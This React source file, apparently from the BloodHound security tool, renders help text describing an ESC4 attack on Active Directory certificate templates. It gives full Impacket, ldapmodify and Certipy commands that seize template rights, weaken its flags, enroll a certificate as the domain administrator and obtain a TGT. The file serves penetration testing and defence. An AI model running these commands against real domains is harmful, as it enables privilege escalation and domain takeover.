// Copyright 2024 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';
import { useHelpTextStyles } from '../utils';
import CodeController from '../CodeController/CodeController';

const LinuxAbuse: FC = () => {
    const classes = useHelpTextStyles();
    const step0_1 = (
        <>
            <Typography variant='body2'>
                <b>Step 0.1: </b>Obtain ownership (WriteOwner only)
                <br />
                <br />
                If you only have WriteOwner on the affected certificate template, then you need to grant your principal
                ownership over the template first.
                <br />
                <br />
                To check the current owner of the certificate template, you may use Impacket's owneredit:
            </Typography>
            <CodeController>
                {`owneredit.py -action read -target-dn 'template-dn' 'domain'/'attacker':'password'`}
            </CodeController>
            <Typography variant='body2'>Change the ownership of the object:</Typography>
            <CodeController>
                {`owneredit.py -action write -owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}
            </CodeController>
            <Typography variant='body2'>
                Confirm that the ownership was changed by running the first command again.
                <br />
                <br />
                After abuse, set the ownership back to previous owner using the second command.
            </Typography>
        </>
    );

    const step0_2 = (
        <>
            <Typography variant='body2'>
                <b>Step 0.2: </b>Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)
                <br />
                <br />
                If you only have WriteOwner, Owns, or WriteDacl on the affected certificate template, then you need to
                grant your principal GenericAll over the template.
                <br />
                <br />
                Impacket's dacledit can be used for that purpose:
            </Typography>
            <CodeController>{`dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}</CodeController>
            <Typography variant='body2'>Confirm that the GenericAll ACE was added:</Typography>
            <CodeController>
                {`dacledit.py -action 'read' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}
            </CodeController>
            <Typography variant='body2'>After abuse, remove the GenericAll ACE you added:</Typography>
            <CodeController>
                {`dacledit.py -action 'remove' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}
            </CodeController>
        </>
    );

    const step1a = (
        <>
            <Typography variant='body2'>
                <b>Step 1.a: </b>Make certificate template ESC1 abusable (GenericAll)
                <br />
                <br />
                If you have an GenericAll edge to the CertTemplate node, or if you have just granted yourself
                GenericAll, then you can use this step to make the template abuseable to ESC1.
                <br />
                <br />
                Use Certipy to overwrite the configuration of the certificate template to make it vulnerable to ESC1:
            </Typography>
            <CodeController>
                {`certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                The <code>-save-old</code> parameter is used to save the old configuration, which is used afterward for
                restoring the configuration:
            </Typography>
            <CodeController>
                {`certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json`}
            </CodeController>
            <Typography variant='body2'>
                Restoring the configuration is vital as the the vulnerable configuration grants Full Control to
                Authenticated Users.
                <br />
                <br />
                The certificate template is now vulnerable to the ESC1 technique and you can continue to Step 2.
            </Typography>
        </>
    );

    const step1b = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 1.b: </b>Ensure the certificate template requires enrollee to specify Subject Alternative Name
                (SAN)(GenericWrite or WritePKINameFlag, no GenericAll).
                <br />
                <br />
                The certificate template requires the enrollee to specify SAN if the CertTemplate node's{' '}
                <em>Enrollee Supplies Subject</em> (<code>enrolleesuppliessubject</code>) is set to True. In that case,
                continue to the next step.
                <br />
                <br />
                If you have an GenericWrite or WritePKINameFlag edge to the CertTemplate node and no GenericAll
                permission, then use this step to set the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag.
                <br />
                <br />
                Check the current value of the <code>msPKI-Certificate-Name-Flag</code> attribute on the certificate
                template using ldapsearch and note it down for later:
            </Typography>
            <CodeController>
                {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Name-Flag`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                Set the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag as the only enabled flag using ldapmodify:
            </Typography>
            <CodeController>
                {`echo -e "dn: "TEMPLATE-DN"\nchangetype: modify\nreplace: msPKI-Certificate-Name-Flag\nmsPKI-Certificate-Name-Flag: 1" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
            </CodeController>
            <Typography variant='body2'>
                Run the first command again to confirm the attribute has been set.
                <br />
                <br />
                After abuse, set the attribute back to the original value by running the command that sets the value,
                but with the original value instead of 1.
            </Typography>
        </>
    );

    const step1c = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 1.c: </b>Ensure the certificate template does not require manager approval (GenericWrite or
                WritePKIEnrollmentFlag, no GenericAll).
                <br />
                <br />
                The certificate template does not require manager approval if the CertTemplate node's{' '}
                <em>Requires Manager Approval</em> (<code>requiresmanagerapproval</code>) is set to False. In that case,
                continue to the next step.
                <br />
                <br />
                If you have an GenericWrite or WritePKIEnrollmentFlag edge to the CertTemplate node and no GenericAll
                permission, then use this step to remove the <code>CT_FLAG_PEND_ALL_REQUESTS</code> flag (manager
                approval).
                <br />
                <br />
                Check the current value of the <code>msPKI-Enrollment-Flag</code> attribute on the certificate template
                using ldapsearch and note it down for later:
            </Typography>
            <CodeController>
                {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Enrollment-Flag`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                Remove all flags from <code>msPKI-Enrollment-Flag</code> using ldapmodify:
            </Typography>
            <CodeController>
                {`echo -e "dn: "TEMPLATE-DN"\nchangetype: modify\nreplace: msPKI-Enrollment-Flag\nmsPKI-Enrollment-Flag: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
            </CodeController>
            <Typography variant='body2'>
                Run the first command again to confirm the attribute has been set.
                <br />
                <br />
                After abuse, set the attribute back to the original value by running the command to set the value, but
                with the original value instead of 0.
            </Typography>
        </>
    );

    const step1d = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 1.d: </b>Ensure the certificate template allows for client authentication (GenericWrite, no
                GenericAll).
                <br />
                <br />
                The certificate template allows for client authentication if the CertTemplate node's{' '}
                <em>Authentication Enabled</em> (<code>authenticationenabled</code>) is set to True. In that case,
                continue to the next step.
                <br />
                <br />
                If you have an GenericWrite edge to the CertTemplate node and no GenericAll permission, then use this
                step to ensure the certificate template allows for client authentication.
                <br />
                <br />
                Check the current value of the <code>msPKI-Certificate-Application-Policy</code> and{' '}
                <code>pKIExtendedKeyUsage</code> attribute on the certificate template using ldapsearch and note it down
                for later:
            </Typography>
            <CodeController>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Application-Policy`}</CodeController>
            <CodeController>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" pKIExtendedKeyUsage`}</CodeController>
            <Typography variant='body2'>Set the Client Authentication EKU using ldapmodify:</Typography>
            <CodeController>
                {`echo -e "dn: "TEMPLATE-DN"
                changetype: modify
                replace: msPKI-Certificate-Application-Policy\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
            </CodeController>
            <CodeController>
                {`echo -e "dn: "TEMPLATE-DN"
                changetype: modify
                replace: pKIExtendedKeyUsage
                pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
            </CodeController>
            <Typography variant='body2'>
                Run the first two command again to confirm the attributes have been set.
                <br />
                <br />
                After abuse, set the attributes back to the original value by running the commands to set the values,
                but with the original values instead. To set multiple EKUs, use this format:
            </Typography>
            <CodeController>
                {`echo -e "dn: "TEMPLATE-DN"
                changetype: modify
                replace: ATTRIBUTE
                ATTRIBUTE: EKU1
                ATTRIBUTE: EKU2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
            </CodeController>
        </>
    );

    const step1e = (
        <>
            <Typography variant='body2' className={classes.containsCodeEl}>
                <b>Step 1.e: </b>Ensure the certificate template does not require authorized signatures (GenericWrite,
                no GenericAll).
                <br />
                <br />
                The certificate template does not require authorized signatures if the CertTemplate node's{' '}
                <em>Authorized Signatures Required</em> (<code>authorizedsignatures</code>) is set to 0 or if the{' '}
                <em>Schema Version</em> (<code>schemaversion</code>) is 1. In that case, continue to the next step.
                <br />
                <br />
                If you have an GenericWrite edge to the CertTemplate node and no GenericAll permission, then use this
                step to ensure the certificate template does not require authorized signatures.
                <br />
                <br />
                The certificate template requires authorized signatures if the certificate template's{' '}
                <code>msPKI-RA-Signature</code>
                attribute value is more than zero. Check the current value of the <code>msPKI-RA-Signature</code>{' '}
                attribute on the certificate template using ldapsearch and note it down for later:
            </Typography>
            <CodeController>
                {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-RA-Signature`}
            </CodeController>
            <Typography variant='body2' className={classes.containsCodeEl}>
                Remove all flags from <code>msPKI-RA-Signature</code> using ldapmodify:
            </Typography>
            <CodeController>
                {`echo -e "dn: "TEMPLATE-DN"
                changetype: modify
                replace: msPKI-RA-Signature
                msPKI-RA-Signature: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
            </CodeController>
            <Typography variant='body2'>
                Run the first command again to confirm the attribute has been set.
                <br />
                <br />
                After abuse, set the attribute back to the original value by running the command that sets the value,
                but with the original value instead of 0.
            </Typography>
        </>
    );

    const step2 = (
        <>
            <Typography variant='body2'>
                <b>Step 2: </b>Enroll certificate.
                <br />
                <br />
                Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and
                target principal to impersonate:
            </Typography>
            <CodeController>
                {`certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local`}
            </CodeController>
        </>
    );
    const step3 = (
        <>
            <Typography variant='body2'>
                <b>Step 3: </b>Authenticate using certificate.
                <br />
                <br />
                Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 2 and
                the IP of a domain controller:
            </Typography>
            <CodeController hideWrap>{`certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128`}</CodeController>
        </>
    );

    return (
        <>
            <Typography variant='body2'>An attacker may perform the ESC4 attack with the following steps.</Typography>
            {step0_1}
            {step0_2}
            {step1a}
            {step1b}
            {step1c}
            {step1d}
            {step1e}
            {step2}
            {step3}
        </>
    );
};

export default LinuxAbuse;
